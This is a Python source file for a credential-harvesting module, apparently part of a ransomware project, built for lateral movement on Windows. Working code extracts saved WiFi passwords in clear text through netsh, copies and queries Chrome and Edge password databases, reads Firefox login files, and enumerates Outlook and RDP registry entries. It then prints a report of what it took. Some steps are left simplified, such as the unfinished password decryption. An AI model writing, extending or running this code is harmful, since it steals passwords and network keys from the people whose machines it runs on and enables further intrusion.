#!/usr/bin/env python3
"""
Credential harvesting module for lateral movement.
Extracts saved passwords, browser credentials, and WiFi keys.
"""

import json
import os
import platform
import re
import sqlite3
import subprocess
from pathlib import Path
from typing import Dict, List, Optional, Tuple

from ransomware.logging import logger


class CredentialHarvester:
    """
    Harvest credentials from various sources.
    """

    def __init__(self):
        self.is_windows = platform.system() == "Windows"
        self.creds: Dict[str, List] = {}

    def harvest_all(self) -> Dict[str, List]:
        """Run all credential harvesting techniques."""
        self.creds = {}

        if self.is_windows:
            self.creds['wifi'] = self.harvest_wifi_passwords()
            self.creds['browsers'] = self.harvest_browser_credentials()
            self.creds['credentials_manager'] = self.harvest_credentials_manager()
            self.creds['outlook'] = self.harvest_outlook_credentials()
            self.creds['rdp'] = self.harvest_rdp_credentials()

        return self.creds

    def harvest_wifi_passwords(self) -> List[Dict]:
        """
        Extract saved WiFi passwords.
        Uses netsh on Windows.
        """
        if not self.is_windows:
            return []

        passwords = []

        try:
            # Get all profiles
            result = subprocess.run(
                ["netsh", "wlan", "show", "profiles"],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                # Extract profile names
                profiles = re.findall(r"All User Profile\s*: (.*)", result.stdout)

                for profile in profiles:
                    profile = profile.strip()

                    # Get password for each profile
                    pass_result = subprocess.run(
                        ["netsh", "wlan", "show", "profile",
                         f"name={profile}", "key=clear"],
                        capture_output=True,
                        text=True,
                        timeout=5
                    )

                    if pass_result.returncode == 0:
                        # Extract key content
                        match = re.search(r"Key Content\s*: (.*)", pass_result.stdout)
                        if match:
                            password = match.group(1).strip()
                            passwords.append({
                                'ssid': profile,
                                'password': password
                            })

        except Exception as e:
            logger.error(f"WiFi password harvesting error: {e}")

        logger.info(f"Harvested {len(passwords)} WiFi passwords")
        return passwords

    def harvest_browser_credentials(self) -> List[Dict]:
        """
        Harvest saved credentials from browsers.
        Supports Chrome, Edge, Firefox.
        """
        if not self.is_windows:
            return []

        all_creds = []

        # Chrome
        all_creds.extend(self._harvest_chrome())

        # Edge
        all_creds.extend(self._harvest_edge())

        # Firefox
        all_creds.extend(self._harvest_firefox())

        logger.info(f"Harvested {len(all_creds)} browser credentials")
        return all_creds

    def _harvest_chrome(self) -> List[Dict]:
        """Harvest Chrome credentials."""
        creds = []

        try:
            # Chrome stores passwords in Login Data SQLite DB
            local_appdata = os.environ.get('LOCALAPPDATA', '')
            chrome_path = Path(local_appdata) / "Google" / "Chrome" / "User Data"

            if not chrome_path.exists():
                return creds

            # Find all profile directories
            for profile_dir in chrome_path.glob("*/Login Data"):
                try:
                    # Copy DB to avoid lock
                    temp_db = profile_dir.parent / "Login Data Copy"
                    shutil.copy2(profile_dir, temp_db)

                    conn = sqlite3.connect(str(temp_db))
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                    for row in cursor.fetchall():
                        url, username, encrypted_password = row

                        # In real malware, would decrypt using DPAPI
                        # Here we just capture encrypted data
                        creds.append({
                            'browser': 'Chrome',
                            'url': url,
                            'username': username,
                            'password_encrypted': base64.b64encode(encrypted_password).decode() if encrypted_password else None
                        })

                    conn.close()
                    temp_db.unlink()

                except Exception as e:
                    logger.error(f"Chrome harvesting error: {e}")

        except Exception as e:
            logger.error(f"Chrome credential error: {e}")

        return creds

    def _harvest_edge(self) -> List[Dict]:
        """Harvest Edge credentials."""
        creds = []

        try:
            local_appdata = os.environ.get('LOCALAPPDATA', '')
            edge_path = Path(local_appdata) / "Microsoft" / "Edge" / "User Data"

            if not edge_path.exists():
                return creds

            # Similar to Chrome
            for profile_dir in edge_path.glob("*/Login Data"):
                try:
                    temp_db = profile_dir.parent / "Login Data Copy"
                    shutil.copy2(profile_dir, temp_db)

                    conn = sqlite3.connect(str(temp_db))
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

                    for row in cursor.fetchall():
                        url, username, encrypted_password = row
                        creds.append({
                            'browser': 'Edge',
                            'url': url,
                            'username': username,
                            'password_encrypted': base64.b64encode(encrypted_password).decode() if encrypted_password else None
                        })

                    conn.close()
                    temp_db.unlink()

                except Exception as e:
                    logger.error(f"Edge harvesting error: {e}")

        except Exception as e:
            logger.error(f"Edge credential error: {e}")

        return creds

    def _harvest_firefox(self) -> List[Dict]:
        """Harvest Firefox credentials."""
        creds = []

        try:
            appdata = os.environ.get('APPDATA', '')
            firefox_path = Path(appdata) / "Mozilla" / "Firefox" / "Profiles"

            if not firefox_path.exists():
                return creds

            # Firefox stores in logins.json
            for profile_dir in firefox_path.glob("*/logins.json"):
                try:
                    with open(profile_dir, 'r') as f:
                        data = json.load(f)

                    for login in data.get('logins', []):
                        creds.append({
                            'browser': 'Firefox',
                            'url': login.get('hostname', ''),
                            'username': login.get('encryptedUsername', ''),
                            'password': login.get('encryptedPassword', '')
                        })

                except Exception as e:
                    logger.error(f"Firefox harvesting error: {e}")

        except Exception as e:
            logger.error(f"Firefox credential error: {e}")

        return creds

    def harvest_credentials_manager(self) -> List[Dict]:
        """
        Harvest Windows Credential Manager entries.
        Uses VaultCmd to enumerate.
        """
        if not self.is_windows:
            return []

        creds = []

        try:
            # List credential vaults
            result = subprocess.run(
                ["vaultcmd", "/list"],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                # Parse vaults
                # Note: vaultcmd doesn't export passwords, just enumerates
                # Real malware would use Vault API
                logger.info("Credential Manager enumeration requires Vault API access")

        except Exception as e:
            logger.error(f"Credential Manager error: {e}")

        return creds

    def harvest_outlook_credentials(self) -> List[Dict]:
        """
        Harvest Outlook/Exchange credentials.
        """
        if not self.is_windows:
            return []

        creds = []

        try:
            # Outlook stores credentials in registry
            # Profile settings in HKEY_CURRENT_USER\Software\Microsoft\Office
            result = subprocess.run(
                ["reg", "query",
                 r"HKCU\Software\Microsoft\Office\16.0\Outlook\Profiles",
                 "/s"],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode == 0:
                logger.info("Outlook profile information found")
                # Would parse for email addresses and server info

        except Exception as e:
            logger.error(f"Outlook credential error: {e}")

        return creds

    def harvest_rdp_credentials(self) -> List[Dict]:
        """
        Harvest RDP saved credentials.
        """
        if not self.is_windows:
            return []

        creds = []

        try:
            # Check RDP history
            result = subprocess.run(
                ["reg", "query",
                 r"HKCU\Software\Microsoft\Terminal Server Client\Default"],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode == 0:
                # Parse MRU entries
                mru_entries = re.findall(r"MRU\d+\s+REG_SZ\s+(.*)", result.stdout)
                for entry in mru_entries:
                    creds.append({
                        'type': 'RDP',
                        'host': entry.strip()
                    })

        except Exception as e:
            logger.error(f"RDP credential error: {e}")

        return creds

    def get_credentials_report(self) -> str:
        """Generate formatted credentials report."""
        if not self.creds:
            self.harvest_all()

        report = []
        report.append("=" * 60)
        report.append("CREDENTIAL HARVESTING REPORT")
        report.append("=" * 60)

        total = 0
        for category, items in self.creds.items():
            report.append(f"\n{category.upper().replace('_', ' ')}: {len(items)} found")
            for item in items[:5]:  # Limit display
                report.append(f"  - {item}")
            total += len(items)

        report.append(f"\nTotal credentials harvested: {total}")
        report.append("=" * 60)

        return "\n".join(report)


import base64
import shutil


if __name__ == "__main__":
    print("Credential Harvester Test")
    print("=" * 60)

    harvester = CredentialHarvester()

    print("\n[*] Harvesting WiFi passwords...")
    wifi = harvester.harvest_wifi_passwords()
    print(f"[+] Found {len(wifi)} WiFi networks")
    for network in wifi[:3]:
        print(f"    {network['ssid']}: {network['password']}")

    print("\n[*] Harvesting browser credentials...")
    browsers = harvester.harvest_browser_credentials()
    print(f"[+] Found {len(browsers)} browser credentials")

    print("\n[*] Harvesting RDP credentials...")
    rdp = harvester.harvest_rdp_credentials()
    print(f"[+] Found {len(rdp)} RDP entries")
    for entry in rdp:
        print(f"    Host: {entry['host']}")

    print("\n[*] Full Report:")
    print(harvester.get_credentials_report())
